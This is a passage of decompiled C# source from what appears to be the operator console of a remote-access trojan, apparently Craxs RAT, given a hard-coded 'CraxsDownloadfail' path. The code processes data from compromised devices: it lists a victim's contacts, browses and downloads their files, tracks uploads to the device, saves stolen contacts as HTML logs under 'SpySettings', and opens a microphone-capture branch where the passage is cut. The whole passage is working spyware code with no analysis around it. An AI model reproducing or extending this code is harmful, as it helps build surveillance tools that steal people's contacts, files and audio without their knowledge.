											_0024VB_0024ResumableLocal_ContactsManager_0024318.tmpAddressIP = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.tmpClientName = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.tmpCountry = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.tmpFolderUSER = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Columns[3].Width = 48;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Columns[3].DisplayIndex = 0;
											_0024VB_0024ResumableLocal_ContactsManager_0024318.Show();
										}
										_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Enabled = false;
										_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Rows.Clear();
										_0024VB_0024ResumableLocal_Counter_0024319 = 0;
										_0024S320 = _0024VB_0024ResumableLocal_SPL_lines_0024316;
										for (_0024S321 = 0; _0024S321 < _0024S320.Length; _0024S321++)
										{
											_0024VB_0024ResumableLocal_ea_0024322 = _0024S320[_0024S321];
											_0024VB_0024ResumableLocal_ay_0024323 = _0024VB_0024ResumableLocal_ea_0024322.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_id_0024324 = _0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Rows.Add(_0024VB_0024ResumableLocal_ay_0024323[0], _0024VB_0024ResumableLocal_ay_0024323[1], _0024VB_0024ResumableLocal_ay_0024323[2], reso.GetEllImage(1, new object[5]
											{
												_0024VB_0024ResumableLocal_ay_0024323[0],
												null,
												null,
												null,
												null
											}));
											_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024324].Tag = _0024VB_0024ResumableLocal_ay_0024323[3];
											_0024VB_0024ResumableLocal_ContactsManager_0024318.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024319, _0024VB_0024ResumableLocal_SPL_lines_0024316.Length - 1);
											_0024VB_0024ResumableLocal_Counter_0024319++;
											Application.DoEvents();
										}
										_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0.Enabled = true;
										_0024VB_0024ResumableLocal_ContactsManager_0024318.PB.Value = 0;
										if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0)
										{
											reso.Directory_Exist(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
											ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
											{
												reso.SAVEit((Array)a0);
											}, new object[8]
											{
												_0024VB_0024ResumableLocal_ContactsManager_0024318.DGV0,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER,
												"Contacts Manager",
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientName,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Country + " - " + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP,
												"Contacts",
												"log",
												DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
											});
										}
									}
									catch (Exception ex101)
									{
										ProjectData.SetProjectError(ex101);
										Exception ex102 = ex101;
										_0024VB_0024ResumableLocal_ex_0024325 = ex102;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, SecurityKey.Bing, TextCompare: false) != 0)
								{
									if (Operators.CompareString(_0024S186, SecurityKey.getfiles, TextCompare: false) == 0)
										try
										{
											_0024VB_0024ResumableLocal_SPL_0024326 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_SPL_lines_0024327 = _0024VB_0024ResumableLocal_SPL_0024326[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
											_0024VB_0024ResumableLocal_handle_0024328 = "File_Manager_File" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.UUID;
											_0024VB_0024ResumableLocal_FileManager_0024329 = (FileManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024328];
											if (_0024VB_0024ResumableLocal_FileManager_0024329 == null)
											{
												_0024VB_0024ResumableLocal_FileManager_0024329 = new FileManager();
												_0024VB_0024ResumableLocal_FileManager_0024329.Tag = "File" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.UUID;
												_0024VB_0024ResumableLocal_FileManager_0024329.Name = _0024VB_0024ResumableLocal_handle_0024328;
												_0024VB_0024ResumableLocal_FileManager_0024329.Title = string.Format("{0} - ID:{1}", "File Manager", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.UUID);
												_0024VB_0024ResumableLocal_FileManager_0024329.Client = _0024VB_0024ResumableLocal_Client_00243;
												_0024VB_0024ResumableLocal_FileManager_0024329.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
												_0024VB_0024ResumableLocal_FileManager_0024329.ver = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.VersionClient;
												_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.AutoGenerateColumns = false;
												_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Columns[5].DisplayIndex = 0;
												_0024VB_0024ResumableLocal_FileManager_0024329.Show();
											}
											_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Enabled = false;
											_0024VB_0024ResumableLocal_FileManager_0024329.PB.BringToFront();
											_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows.Clear();
											_0024VB_0024ResumableLocal_idx_0024330 = _0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows.Add("..", null, null, null, null, getIconFrmReg.GetIcon(reso.res_Path, Operators.CompareString(SpySettings.FM_IC_Size, "Large", TextCompare: false) == 0));
											_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows[_0024VB_0024ResumableLocal_idx_0024330].Cells[0].Tag = "back";
											_0024VB_0024ResumableLocal_Counter_0024331 = 0;
											_0024S332 = _0024VB_0024ResumableLocal_SPL_lines_0024327;
											_0024S333 = 0;
											while (_0024S333 < _0024S332.Length)
											{
												_0024VB_0024ResumableLocal_ea_0024334 = _0024S332[_0024S333];
												_0024VB_0024ResumableLocal_ay_0024335 = _0024VB_0024ResumableLocal_ea_0024334.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
												if (Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024335[0], "-1", TextCompare: false) != 0)
												{
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Tag = _0024VB_0024ResumableLocal_ay_0024335[4];
													_0024VB_0024ResumableLocal_exType_0024336 = "n/a";
													if (Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024335[1], "0", TextCompare: false) == 0)
														_0024VB_0024ResumableLocal_exType_0024336 = $"Folder [{_0024VB_0024ResumableLocal_ay_0024335[7]}]";
													else if (Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024335[1], "1", TextCompare: false) == 0)
													{
														_0024VB_0024ResumableLocal_exType_0024336 = "File";
													}
													_0024VB_0024ResumableLocal_ti_0024337 = _0024VB_0024ResumableLocal_ay_0024335[5];
													_0024VB_0024ResumableLocal_ne_0024338 = "no";
													if (Operators.CompareString(_0024VB_0024ResumableLocal_ti_0024337.Trim(), _0024VB_0024ResumableLocal_ay_0024335[6].Trim(), TextCompare: false) == 0)
														_0024VB_0024ResumableLocal_ne_0024338 = "yes";
													_0024VB_0024ResumableLocal_FileSize_0024339 = Strings.Space(1);
													if (Operators.CompareString(_0024VB_0024ResumableLocal_exType_0024336, "File", TextCompare: false) == 0)
														_0024VB_0024ResumableLocal_FileSize_0024339 = reso.BytesConverter(Conversions.ToLong(_0024VB_0024ResumableLocal_ay_0024335[3]));
													_0024VB_0024ResumableLocal_Extens_0024340 = ".null";
													try
													{
														_0024VB_0024ResumableLocal_info_0024341 = new FileInfo(_0024VB_0024ResumableLocal_ay_0024335[2]);
														_0024VB_0024ResumableLocal_Extens_0024340 = _0024VB_0024ResumableLocal_info_0024341.Extension.ToLower();
														if (!_0024VB_0024ResumableLocal_Extens_0024340.Contains("."))
															_0024VB_0024ResumableLocal_Extens_0024340 = ".null";
														else if (Operators.CompareString(_0024VB_0024ResumableLocal_exType_0024336, "File", TextCompare: false) == 0)
														{
															_0024VB_0024ResumableLocal_exType_0024336 = _0024VB_0024ResumableLocal_Extens_0024340.Replace(".", "");
														}
													}
													catch (Exception ex103)
													{
														ProjectData.SetProjectError(ex103);
														Exception ex104 = ex103;
														_0024VB_0024ResumableLocal_ex_0024342 = ex104;
														ProjectData.ClearProjectError();
													}
													_0024VB_0024ResumableLocal_id_0024343 = _0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows.Add(_0024VB_0024ResumableLocal_exType_0024336, _0024VB_0024ResumableLocal_ay_0024335[2], _0024VB_0024ResumableLocal_FileSize_0024339, _0024VB_0024ResumableLocal_ay_0024335[5], _0024VB_0024ResumableLocal_ay_0024335[6], (Operators.CompareString(_0024VB_0024ResumableLocal_ay_0024335[1], "0", TextCompare: false) == 0) ? getIconFrmReg.GetIcon(reso.res_Path, Operators.CompareString(SpySettings.FM_IC_Size, "Large", TextCompare: false) == 0) : getIconFrmReg.GetFileIcon(_0024VB_0024ResumableLocal_Extens_0024340));
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024343].Cells[2].Tag = _0024VB_0024ResumableLocal_ay_0024335[3];
													if (Operators.CompareString(_0024VB_0024ResumableLocal_ne_0024338, "yes", TextCompare: false) == 0)
														_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024343].DefaultCellStyle.ForeColor = Color.Red;
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows[_0024VB_0024ResumableLocal_id_0024343].Cells[0].Tag = _0024VB_0024ResumableLocal_ay_0024335[1];
													_0024VB_0024ResumableLocal_FileManager_0024329.PB.Value = Codes.RateConverter(_0024VB_0024ResumableLocal_Counter_0024331, _0024VB_0024ResumableLocal_SPL_lines_0024327.Length - 1);
													_0024VB_0024ResumableLocal_Counter_0024331++;
													Application.DoEvents();
													_0024S333++;
													continue;
												}
												_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Tag = _0024VB_0024ResumableLocal_ay_0024335[1];
												break;
											}
											_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Enabled = true;
											_0024VB_0024ResumableLocal_FileManager_0024329.PB.Value = 0;
											_0024VB_0024ResumableLocal_FileManager_0024329.Text = _0024VB_0024ResumableLocal_FileManager_0024329.Title;
											_0024VB_0024ResumableLocal_FileManager_0024329.pathtxt.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(Strings.Space(1), _0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Tag)));
											_0024VB_0024ResumableLocal_FileManager_0024329.PB.SendToBack();
											try
											{
												_0024VB_0024ResumableLocal_thekey_0024344 = _0024VB_0024ResumableLocal_FileManager_0024329.pathtxt.Text.ToString();
												_0024VB_0024ResumableLocal_thepath_0024345 = _0024VB_0024ResumableLocal_FileManager_0024329.pathtxt.Text;
												if (_0024VB_0024ResumableLocal_FileManager_0024329.paths_indexs.Contains(_0024VB_0024ResumableLocal_thepath_0024345))
												{
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.FirstDisplayedScrollingRowIndex = _0024VB_0024ResumableLocal_FileManager_0024329.Correntindex;
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.ClearSelection();
													_0024VB_0024ResumableLocal_FileManager_0024329.DGV0.Rows[_0024VB_0024ResumableLocal_FileManager_0024329.Correntindex].Selected = true;
												}
											}
											catch (Exception ex105)
											{
												ProjectData.SetProjectError(ex105);
												Exception ex106 = ex105;
												_0024VB_0024ResumableLocal_ex_0024346 = ex106;
												ProjectData.ClearProjectError();
											}
										}
										catch (Exception ex107)
										{
											ProjectData.SetProjectError(ex107);
											Exception ex108 = ex107;
											_0024VB_0024ResumableLocal_ex_0024347 = ex108;
											ProjectData.ClearProjectError();
										}
									else if (Operators.CompareString(_0024S186, checkforINFO(_0024VB_0024ResumableLocal_getCase_00247), TextCompare: false) == 0)
									{
										try
										{
											_0024VB_0024ResumableLocal_SPL_0024348 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Replace("\r\n", "")
												.Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal_casedata_0024349 = _0024VB_0024ResumableLocal_getCase_00247.Split('>');
											_0024VB_0024ResumableLocal_Targetuuid_0024350 = _0024VB_0024ResumableLocal_casedata_0024349[1];
											_0024VB_0024ResumableLocal_nameFolder_0024351 = "Downloads";
											_0024VB_0024ResumableLocal_client_Download_path_0024352 = "";
											try
											{
												_0024S353 = Application.OpenForms.GetEnumerator();
												while (_0024S353.MoveNext())
												{
													_0024VB_0024ResumableLocal_frm_0024354 = (Form)_0024S353.Current;
													if (_0024VB_0024ResumableLocal_frm_0024354 != null && _0024VB_0024ResumableLocal_frm_0024354.Tag != null && Operators.CompareString(_0024VB_0024ResumableLocal_frm_0024354.Tag.ToString(), _0024VB_0024ResumableLocal_Targetuuid_0024350, TextCompare: false) == 0)
													{
														_0024VB_0024ResumableLocal_client_Download_path_0024352 = ((FileManager)_0024VB_0024ResumableLocal_frm_0024354).classClient.FolderUSER + "\\" + _0024VB_0024ResumableLocal_nameFolder_0024351;
														break;
													}
												}
											}
											finally
											{
												if (num < 0 && _0024S353 is IDisposable)
													(_0024S353 as IDisposable).Dispose();
											}
											if (Conversions.ToLong(_0024VB_0024ResumableLocal_SPL_0024348[1]) == 0L)
											{
												_0024VB_0024ResumableLocal_start_0024355 = _0024VB_0024ResumableLocal_SPL_0024348[0].LastIndexOf("/");
												_0024VB_0024ResumableLocal_down_0024356 = _0024VB_0024ResumableLocal_client_Download_path_0024352;
												if (!Directory.Exists(_0024VB_0024ResumableLocal_down_0024356))
													Directory.CreateDirectory(_0024VB_0024ResumableLocal_down_0024356);
												_0024VB_0024ResumableLocal_down_0024356 = _0024VB_0024ResumableLocal_down_0024356 + "\\" + _0024VB_0024ResumableLocal_SPL_0024348[0].Substring(_0024VB_0024ResumableLocal_start_0024355 + 1);
												try
												{
													if (File.Exists(_0024VB_0024ResumableLocal_down_0024356))
														File.Delete(_0024VB_0024ResumableLocal_down_0024356);
													File.Create(_0024VB_0024ResumableLocal_down_0024356).Dispose();
												}
												catch (Exception projectError)
												{
													ProjectData.SetProjectError(projectError);
													ProjectData.ClearProjectError();
												}
											}
											else
											{
												_0024VB_0024ResumableLocal_usrfiles_0024357 = "File_Manager_" + _0024VB_0024ResumableLocal_Targetuuid_0024350;
												_0024VB_0024ResumableLocal_FileManagerDown_0024358 = (FileManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_usrfiles_0024357];
												if (_0024VB_0024ResumableLocal_FileManagerDown_0024358 != null)
												{
													_0024VB_0024ResumableLocal_start_0024359 = _0024VB_0024ResumableLocal_SPL_0024348[0].LastIndexOf("/");
													_0024VB_0024ResumableLocal_FName_0024360 = _0024VB_0024ResumableLocal_SPL_0024348[0].Substring(_0024VB_0024ResumableLocal_start_0024359 + 1).Replace("\n", "***");
													if (_0024VB_0024ResumableLocal_FName_0024360.Contains("***"))
													{
														_0024VB_0024ResumableLocal_FIXNAMES_0024361 = _0024VB_0024ResumableLocal_FName_0024360.Split('*');
														_0024VB_0024ResumableLocal_FName_0024360 = _0024VB_0024ResumableLocal_FIXNAMES_0024361[0] + _0024VB_0024ResumableLocal_FIXNAMES_0024361[1];
													}
													if (!_0024VB_0024ResumableLocal_FileManagerDown_0024358.DownStreams.Contains(_0024VB_0024ResumableLocal_FName_0024360))
													{
														_0024VB_0024ResumableLocal_FPath_0024362 = _0024VB_0024ResumableLocal_SPL_0024348[0];
														_0024VB_0024ResumableLocal_FSize_0024363 = reso.BytesConverter(Conversions.ToLong(_0024VB_0024ResumableLocal_SPL_0024348[1]));
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.DownFolder = _0024VB_0024ResumableLocal_client_Download_path_0024352;
														_0024VB_0024ResumableLocal_rowid_0024364 = _0024VB_0024ResumableLocal_FileManagerDown_0024358.DGVDATA.Rows.Add(_0024VB_0024ResumableLocal_FName_0024360, _0024VB_0024ResumableLocal_FPath_0024362, _0024VB_0024ResumableLocal_FSize_0024363, "0", "Starting..");
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.Downloadnum.Text = _0024VB_0024ResumableLocal_FileManagerDown_0024358.DGVDATA.Rows.Count.ToString();
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.Downloadnum.ForeColor = Color.Red;
														_0024VB_0024ResumableLocal_TheStream_0024365 = null;
														_0024VB_0024ResumableLocal__stream_0024366 = 0L;
														_0024VB_0024ResumableLocal_TotalSize_0024367 = Conversions.ToLong(_0024VB_0024ResumableLocal_SPL_0024348[1]);
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.DGVDATA.Rows[_0024VB_0024ResumableLocal_rowid_0024364].Tag = "Download_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.DGVDATA.Rows[_0024VB_0024ResumableLocal_rowid_0024364].DefaultCellStyle.ForeColor = Color.Red;
														_0024VB_0024ResumableLocal_FileManagerDown_0024358.DownStreams.Add(new object[3] { _0024VB_0024ResumableLocal_TheStream_0024365, _0024VB_0024ResumableLocal__stream_0024366, _0024VB_0024ResumableLocal_TotalSize_0024367 }, _0024VB_0024ResumableLocal_FName_0024360);
													}
													else
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
														MyProject.Forms.FileManager.Dispose();
													}
												}
											}
										}
										catch (Exception ex109)
										{
											ProjectData.SetProjectError(ex109);
											Exception ex110 = ex109;
											_0024VB_0024ResumableLocal_ex_0024368 = ex110;
											ProjectData.ClearProjectError();
										}
									}
									else if (Operators.CompareString(_0024S186, checkforDB(_0024VB_0024ResumableLocal_getCase_00247), TextCompare: false) == 0)
									{
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit)
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient != null)
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit = true;
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
											}
										}
										else
										{
											_0024VB_0024ResumableLocal_casedata_0024369 = _0024VB_0024ResumableLocal_getCase_00247.Split('>');
											_0024VB_0024ResumableLocal_Targetuuid_0024370 = _0024VB_0024ResumableLocal_casedata_0024369[1];
											_0024VB_0024ResumableLocal_usrfiles_0024371 = "File_Manager_" + _0024VB_0024ResumableLocal_Targetuuid_0024370;
											_0024VB_0024ResumableLocal_FileManagerDown_0024372 = (FileManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_usrfiles_0024371];
											if (_0024VB_0024ResumableLocal_FileManagerDown_0024372 != null)
												try
												{
													_0024S373 = ((IEnumerable)_0024VB_0024ResumableLocal_FileManagerDown_0024372.DGVDATA.Rows).GetEnumerator();
													while (_0024S373.MoveNext())
													{
														_0024VB_0024ResumableLocal_ro_0024374 = (DataGridViewRow)_0024S373.Current;
														if (!Operators.ConditionalCompareObjectEqual(_0024VB_0024ResumableLocal_ro_0024374.Tag, "Download_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress, TextCompare: false))
															continue;
														_0024VB_0024ResumableLocal_ro_0024374.DefaultCellStyle.ForeColor = Color.Orange;
														_0024VB_0024ResumableLocal_Filenamess_0024375 = _0024VB_0024ResumableLocal_ro_0024374.Cells[0].Value.ToString();
														_0024VB_0024ResumableLocal_mydata_0024376 = RuntimeHelpers.GetObjectValue(reso.GETKEY(_0024VB_0024ResumableLocal_Filenamess_0024375, _0024VB_0024ResumableLocal_FileManagerDown_0024372.DownStreams));
														_0024VB_0024ResumableLocal_FSTREAM_0024377 = (FileStream)NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_mydata_0024376, new object[1] { 0 }, null);
														_0024VB_0024ResumableLocal_FSSIZE_0024378 = Conversions.ToLong(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_mydata_0024376, new object[1] { 1 }, null)));
														if (Operators.ConditionalCompareObjectEqual(_0024VB_0024ResumableLocal_ro_0024374.Tag, "X", TextCompare: false))
														{
															try
															{
																if (_0024VB_0024ResumableLocal_FSTREAM_0024377 != null)
																{
																	_0024VB_0024ResumableLocal_FSTREAM_0024377.Dispose();
																	_0024VB_0024ResumableLocal_FSTREAM_0024377.Close();
																	_0024VB_0024ResumableLocal_FSTREAM_0024377 = null;
																}
															}
															catch (Exception ex111)
															{
																ProjectData.SetProjectError(ex111);
																Exception ex112 = ex111;
																_0024VB_0024ResumableLocal_ex_0024379 = ex112;
																ProjectData.ClearProjectError();
															}
															try
															{
																if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient != null)
																{
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.qit = true;
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
																}
															}
															catch (Exception ex113)
															{
																ProjectData.SetProjectError(ex113);
																Exception ex114 = ex113;
																_0024VB_0024ResumableLocal_ex_0024380 = ex114;
																ProjectData.ClearProjectError();
																goto IL_7a4a;
															}
															break;
														}
														goto IL_7a4a;
													IL_7a4a:
														_0024VB_0024ResumableLocal_TotalSize_0024381 = Conversions.ToLong(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(_0024VB_0024ResumableLocal_mydata_0024376, new object[1] { 2 }, null)));
														_0024VB_0024ResumableLocal_down_0024382 = _0024VB_0024ResumableLocal_FileManagerDown_0024372.DownFolder;
														if (!Directory.Exists(_0024VB_0024ResumableLocal_down_0024382))
															Directory.CreateDirectory(_0024VB_0024ResumableLocal_down_0024382);
														_0024VB_0024ResumableLocal_down_0024382 = _0024VB_0024ResumableLocal_down_0024382 + "\\" + _0024VB_0024ResumableLocal_Filenamess_0024375;
														while (true)
														{
															try
															{
																if ((_0024VB_0024ResumableLocal_FSTREAM_0024377 == null) & (_0024VB_0024ResumableLocal_FSSIZE_0024378 == 0L))
																{
																	_0024VB_0024ResumableLocal_ro_0024374.Cells[4].Value = "Downloading..";
																	_0024VB_0024ResumableLocal_FSTREAM_0024377 = new FileStream(_0024VB_0024ResumableLocal_down_0024382, FileMode.OpenOrCreate, FileAccess.Write);
																}
																_0024VB_0024ResumableLocal_Byte__0024383 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
																_0024VB_0024ResumableLocal_FSTREAM_0024377.Write(_0024VB_0024ResumableLocal_Byte__0024383, 0, _0024VB_0024ResumableLocal_Byte__0024383.Length);
																_0024VB_0024ResumableLocal_FSTREAM_0024377.Flush();
																_0024VB_0024ResumableLocal_FSSIZE_0024378 += _0024VB_0024ResumableLocal_Byte__0024383.Length;
																reso.UPDATEKEY(_0024VB_0024ResumableLocal_Filenamess_0024375, _0024VB_0024ResumableLocal_FileManagerDown_0024372.DownStreams, new object[3] { _0024VB_0024ResumableLocal_FSTREAM_0024377, _0024VB_0024ResumableLocal_FSSIZE_0024378, _0024VB_0024ResumableLocal_TotalSize_0024381 });
																_0024VB_0024ResumableLocal_ro_0024374.Cells[3].Value = reso.BytesConverter(_0024VB_0024ResumableLocal_FSSIZE_0024378).ToString();
															}
															catch (Exception ex115)
															{
																ProjectData.SetProjectError(ex115);
																Exception ex116 = ex115;
																_0024VB_0024ResumableLocal_exe_0024384 = ex116;
																_0024VB_0024ResumableLocal_down_0024382 = "D:\\CraxsDownloadfail\\" + _0024VB_0024ResumableLocal_Filenamess_0024375;
																ProjectData.ClearProjectError();
																continue;
															}
															finally
															{
																if (num < 0 && _0024VB_0024ResumableLocal_FSSIZE_0024378 == _0024VB_0024ResumableLocal_TotalSize_0024381)
																{
																	_0024VB_0024ResumableLocal_FileManagerDown_0024372.Downloadnum.ForeColor = Color.Green;
																	_0024VB_0024ResumableLocal_ro_0024374.Cells[4].Value = "Done..";
																	_0024VB_0024ResumableLocal_ro_0024374.Tag = "f";
																	_0024VB_0024ResumableLocal_ro_0024374.DefaultCellStyle.ForeColor = Color.Lime;
																	if (_0024VB_0024ResumableLocal_FSTREAM_0024377 != null)
																	{
																		_0024VB_0024ResumableLocal_FSTREAM_0024377.Dispose();
																		_0024VB_0024ResumableLocal_FSTREAM_0024377.Close();
																		_0024VB_0024ResumableLocal_FSTREAM_0024377 = null;
																	}
																	_0024VB_0024ResumableLocal_FSSIZE_0024378 = 0L;
																	_0024VB_0024ResumableLocal_FileManagerDown_0024372.DownStreams.Remove(_0024VB_0024ResumableLocal_Filenamess_0024375);
																	_0024VB_0024ResumableLocal_ro_0024374.Dispose();
																	_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
																}
															}
															break;
														}
														break;
													}
												}
												finally
												{
													if (num < 0 && _0024S373 is IDisposable)
														(_0024S373 as IDisposable).Dispose();
												}
										}
									}
									else if (Operators.CompareString(_0024S186, SecurityKey.upload_info, TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.shot = false;
										_0024VB_0024ResumableLocal_SPL_0024385 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
										if (File.Exists(_0024VB_0024ResumableLocal_SPL_0024385[3]))
											try
											{
												_0024VB_0024ResumableLocal_handle_0024386 = "Upload_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_Upload_0024387 = (Upload)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024386];
												if (_0024VB_0024ResumableLocal_Upload_0024387 == null)
												{
													_0024VB_0024ResumableLocal_Upload_0024387 = new Upload();
													_0024VB_0024ResumableLocal_Upload_0024387.Name = _0024VB_0024ResumableLocal_handle_0024386;
													_0024VB_0024ResumableLocal_Upload_0024387.Title = string.Format("{0} - IP:{1}", "Upload", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_Upload_0024387.SPL = _0024VB_0024ResumableLocal_SPL_0024385;
													_0024VB_0024ResumableLocal_Upload_0024387.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_Upload_0024387.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_Upload_0024387.DGV0.Rows.Add("Name --->", _0024VB_0024ResumableLocal_SPL_0024385[2]);
													_0024VB_0024ResumableLocal_Upload_0024387.DGV0.Rows.Add("Path to --->", _0024VB_0024ResumableLocal_SPL_0024385[0]);
													_0024VB_0024ResumableLocal_Upload_0024387.DGV0.Rows.Add("Path From --->", _0024VB_0024ResumableLocal_SPL_0024385[3]);
													_0024VB_0024ResumableLocal_Upload_0024387.DGV0.Rows.Add("Size --->", reso.BytesConverter(Conversions.ToLong(_0024VB_0024ResumableLocal_SPL_0024385[1])));
													_0024VB_0024ResumableLocal_Upload_0024387.DGV0.Rows.Add("Time --->", "...");
													_0024VB_0024ResumableLocal_Upload_0024387.ProgressBar1.Maximum = Conversions.ToInteger(_0024VB_0024ResumableLocal_SPL_0024385[1]);
													_0024VB_0024ResumableLocal_Upload_0024387.start_time = DateAndTime.Now;
													_0024VB_0024ResumableLocal_Upload_0024387.TotalSize = Conversions.ToLong(_0024VB_0024ResumableLocal_SPL_0024385[1]);
													_0024VB_0024ResumableLocal_Upload_0024387.Show();
												}
											}
											catch (Exception ex117)
											{
												ProjectData.SetProjectError(ex117);
												Exception ex118 = ex117;
												_0024VB_0024ResumableLocal_ex_0024388 = ex118;
												ProjectData.ClearProjectError();
											}
										else
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
									}
									else if (Operators.CompareString(_0024S186, SecurityKey.MicwaveinByte, TextCompare: false) == 0)
									{
										try
										{
											_0024VB_0024ResumableLocal_SPL_0024389 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
